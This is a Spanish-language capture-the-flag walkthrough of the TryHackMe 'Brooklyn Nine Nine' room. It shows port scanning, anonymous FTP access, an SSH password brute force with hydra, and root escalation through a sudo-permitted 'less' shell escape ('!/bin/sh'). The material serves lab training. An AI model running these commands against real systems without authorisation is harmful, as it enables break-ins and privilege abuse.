# Escalada de Privilegios en Linux – Sudo -l | Parte 2

Maquinas que vamos a utilizar **Kali Linux y Brooklyn Nine Nine** [https://tryhackme.com/room/brooklynninenine](https://tryhackme.com/room/brooklynninenine)

```bash
ping -c 1 10.10.196.44
```

![image.png](./imagenes/image%2026.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.10.196.44
```

![image.png](./imagenes/image%2027.png)

- Vamos a ver lo que esta corriendo por el puerto 80 a través del navegador web.
    
    ![image.png](./imagenes/image%2028.png)
    
    No parece que haya nada interesante aqui.
    
- Vamos a probar el login FTP como **anonymous.**
    
    ```bash
    ftp 10.10.196.44
    ```
    
    ![image.png](./imagenes/image%2029.png)
    
    - Hacemos un listado de archivos
        
        `ls`
        
        ![image.png](./imagenes/image%2030.png)
        
        Nos encontramos un archivo note_to_jake.txt , que vamos a intentar bajárnoslo a nuestro ordenador utilizando el comando **get**.
        
        `get note_to_jake.txt`
        
        ![image.png](./imagenes/image%2031.png)
        
        `exit`
        
    
- Verificamos la descarga del archivo.
    
    ```bash
    ls
    ```
    
    ![image.png](./imagenes/image%2032.png)
    

- Miramos su contenido
    
    ```bash
     cat note_to_jake.txt 
    ```
    
    ![image.png](./imagenes/image%2033.png)
    
    Hemos conseguido el nombre de un usuario.
    

<aside>
💡

Recapitulemos la maquina victima tiene **abierto** el puerto **21 FTP** y el puerto **22 SSH**. Tenemos un **nombre de usuario** **Jake** por tanto podemos hacer una **ataque de fuerza bruta con Hydra**.

</aside>

- Atacamos el puerto SSH
    
    ```bash
    hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.196.44
    ```
    
    ![image.png](./imagenes/image%2034.png)
    
- Lo probamos
    
    ```bash
    ssh [jake@10.10.196.44](./imagenes/mailto:jake@10.10.196.44)
    ```
    
    ![image.png](./imagenes/image%2035.png)
    
    Ya estamos dentro. 
    
    ---
    
- Ahora vamos a intentar escalar privilegios mediante **sudo -l**.
    
    `sudo -l`
    
    ![image.png](./imagenes/image%2036.png)
    
    Vemos que **podemos ejecutar** el binario **less** con sudo.
    
- Nos vamos a la web [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/). Y **buscamos** el binario **less con sudo.**
    
    ![image.png](./imagenes/image%2037.png)
    
    ![image.png](./imagenes/image%2038.png)
    

- Ejecutamos los comandos. NOTA: no olvidar poner la ruta absoluta para evitar errores.
    
    `sudo less /etc/profile`
    
    ![image.png](./imagenes/image%2039.png)
    
    ![image.png](./imagenes/image%2040.png)
    

`!/bin/sh` y pulsamos la tecla Enter

![image.png](./imagenes/image%2041.png)

`whoami`

![image.png](./imagenes/image%2042.png)